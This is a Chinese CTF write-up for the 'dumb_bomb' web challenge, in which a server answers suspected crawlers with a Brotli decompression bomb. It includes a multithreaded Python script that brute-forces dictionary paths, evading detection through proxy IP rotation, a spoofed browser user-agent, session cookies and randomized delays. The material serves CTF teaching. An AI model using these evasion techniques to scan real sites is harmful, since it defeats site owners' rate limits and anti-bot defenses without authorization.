# dumb_bomb

- 出题人: pyy

- 验题人: pyy

## 题目描述

> 笨笨炸弹! (你可能觉得我是可莉厨, 但我和她不熟)

在吸取了上次被扫描后台的经验之后, 我制作了究极反爬机制, 给检测出的爬虫致命一击! 就算字典里有我的flag路径, 你们也拿不到

啊, 这个反爬机制好像有点笨? 但愿不要误伤到无辜的人群()

无法访问此页面? 没事, 反正你也不用浏览器爬对吧~

温馨提示: 访问`/small_bomb`来体验1/64炸弹的威力. 请注意内存噢~

**第二阶段提示:** 这是一个gzip炸弹一样的东西, 但是只有在检测到你是爬虫才会发作(真的嘛?), 那怎么让他觉得你不是爬虫捏? (难道要自己写python了!)

## 出题思路

在网上看到一个gzip炸弹之后觉得挺好玩的, 试了下dirsearch爬炸弹会吃完内存, 所以就写了一个用压缩包炸弹来反爬的小程序. [吃内存的网页炸弹 – 晨旭的博客](https://www.chenxublog.com/2020/11/16/web-bomb-eat-memory.html)

原理简单来说就是服务器使用压缩算法给你传一个压缩包, 部分压缩包因为内容完全相同, 所以压缩完以后占用空间很小, 但解压后可以很大(本题是一个64g的Brotli压缩包(也就是.br包)).

一些浏览器打不开的原因是默认请求头accept-encoding不包含br, 因此无法解析返回的br压缩包. 但dirsearch是会解压的(至少我的会), 所以会出现吃内存的问题(咦, 但是好像有同学说他dirsearch只会扫出来一堆错)

本题识别到爬虫就会返回一个压缩包炸弹, flag藏在字典中的某个路径. 当认为是正常访问时才会返回一个正常的结果. 识别手段有以下三种:

- 访问频率: 要求同一个ip30秒内访问次数不超过10次, 并且间隔的方差超过0.05(如果30秒内访问>=3次的话; 这个限制一般)
- cookie验证: 每次访问除了`'/','/bomb','/small_bomb'`以外的任意路径都会查询cookie中的session值, 如果redis中没有这个值则认为是爬虫, 否则允许访问但赋予一个新的值.
- ua等验证: 使用crawlerdetect.CrawlerDetect进行header验证, 会ban掉爬虫ua.

## 解法

ip的访问频率可以使用兴趣小组讲过的clash作为ip轮换的方法解决, 具体操作见: [Clash实现IP秒级切换(含简易源码分析)](https://segmentfault.com/a/1190000040828310). 一般来说, 大伙的clash里至少会有20个节点, 这足够用两个小时跑出结果了. 此外, 间隔的方差加一个随机数就可以大致解决.

cookie验证的话, 使用requests.Session即可自动记录cookie. (在访问`/`的时候会给一个set-cookie, 此时Session会自动记录, 并且在下一次发送数据包的时候加上这个cookie). 

UA复制一个浏览器的就可以解决.

以上是思路, 以下是代码

```python
# 炸弹指的是压缩包炸弹, 但是会返回br结果, 如果直接爬取会出问题
# 反爬手段: 1. 限制同ip访问频率(访问间隔是否固定, 30秒内是否超过10次) 2. 检测ua 3. 检测cookie
# 反制手段: 1. 慢慢爬/ip池 2. 使用浏览器ua 3. 使用requests.Session

#随机与延时
from random import random as rd
from time import sleep 
#线程池, 让他拿着一个session去爬
from concurrent.futures import ThreadPoolExecutor
#进度条, 有效降低人的焦躁感
from tqdm import tqdm

#请求库
import requests
#便于f5的时候读取
from pitricks.utils import pwd

#目标网站
URL = 'http://121.5.48.11:20016/'

#随便继承一个错误类
class SessionWrong(Exception):
  pass

#读取字典文件, 按照行分割
def get_dict():
  with open(pwd()/'dict.txt') as f:
    return [line.strip() for line in f.readlines()]

#初始化session, 并且访问网站根目录(这样就可以获得初始session)
def init_session():
  sess = requests.Session()
  sess.get(URL)
  return sess

#爬取一个url
def craw_one(url: str, sess: requests.Session):
  # 设置stream=True, 避免自动解压
  # 设置ua为浏览器ua
  # 使用clash代理, clash里开负载均衡
  res = sess.get(
    url, stream=True,
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68'}, 
    proxies={'http': "http://127.0.0.1:7890"})
  # 发现爬到了炸弹, 停止8秒后跳出(轻轻举起异常)
  if res.headers.get('content-encoding', None)=='br':
    sleep(rd()*16)
    # print("sleep......")
    raise SessionWrong()
  # 这个节点坏掉了, 再发一次包(clash会自动换节点)
  if res.status_code==502:
    return craw_one(url, sess)
  #如果不是404, 返回True
  return res.status_code!=404

#初始化一个进度条
progress_bar: tqdm
#爬取list内的所有path
def craw(paths: list[str]):
  #把外面的进度条拿进来
  global progress_bar
  #初始化一个session
  sess = init_session()
  #遍历每一个path
  for path in paths:
    #如果爬取失败, 重试
    while True:
      try:
        if craw_one(URL+path, sess):
          print(path)
        break
      except requests.exceptions.ConnectionError:
        pass
      except SessionWrong:
        #如果session坏了, 重新初始化
        sess = init_session()
    
    #进度条++
    progress_bar.update()
    #随机延时5秒左右
    sleep(rd()*10)

if __name__=='__main__':
  #读取字典
  dic = get_dict()
  #初始化进度条
  progress_bar = tqdm(range(len(dic)))
  #开80个线程(因为我有130个节点)
  pool = ThreadPoolExecutor(80)
  #按照20个一组, 分组爬取
  [f.result()
   for f in [pool.submit(craw, dic[i:i+20]) 
             for i in range(0, len(dic), 20)]]
```

```yaml
# clash parsers
parsers: # array
  - url: xxx
    yaml:
      append-proxy-groups:
        - name: ⚖️ 负载均衡-轮询
          url: 'http://www.google.com/generate_204'
          interval: 600
          type: load-balance
          strategy: round-robin
      commands:
        - proxy-groups.⚖️ 负载均衡-轮询.proxies=[]proxyNames
        - proxy-groups.0.proxies.0+⚖️ 负载均衡-轮询
```

